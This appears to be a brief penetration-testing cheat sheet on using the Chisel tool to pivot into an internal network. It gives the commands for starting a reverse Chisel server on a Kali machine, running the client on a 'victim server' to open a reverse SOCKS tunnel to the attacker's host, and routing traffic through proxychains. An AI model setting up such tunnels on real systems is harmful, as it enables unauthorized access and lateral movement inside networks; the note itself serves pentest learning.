Chisel :- Best tool to be used for Pivorting the Internal Network. 

Step 1) Run the below command in the Kali machine 
       umarkhan# ./chisel server -p 8001 --reverse

Step 2) Transfer the Chisel program to the victim server 

Step 3) Now we can establish the reverse connection from server to the Kali machine
        C:\ ./chisel client <Kali Machine IP>:8001 R:1080:socks

Step 4) We need to change the proxychain config in the Kali machine 
        socks5 127.0.0.1 1080 <1080 is the port we configured as reverse port>

Step 5) Now we can intiate the connection for the Internal network from Kali itself
